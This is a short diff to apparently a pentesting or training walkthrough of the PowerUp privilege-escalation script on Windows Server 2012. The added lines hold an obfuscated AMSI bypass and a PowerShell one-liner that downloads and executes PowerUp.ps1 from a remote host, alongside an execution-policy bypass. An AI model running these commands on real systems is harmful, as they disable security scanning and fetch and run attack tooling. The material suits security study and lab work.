@@ -46,7 +46,11 @@ Example - Output of the PowerUP script run on a vulnerable Windows server 2012 R
 - PowerUP version used: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
 
 PS C:\> powershell -ep bypass
-PS C:\> import-module .\PowerUp.ps1
+
+PS C:\Users\studentuser> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYp <SNIP>     //Bypass AMSI
+
+PS C:\> iex (New-Object Net.WebClient).DownloadString('http://XX.XX.XX.XX/PowerUp.ps1')        //we could have also download locally an obfusctaed version PoerUp.ps1 and then import it ('import-module .\PowerUp.ps1')
+
 PS C:\> invoke-allchecks
 
 [*] Running Invoke-AllChecks
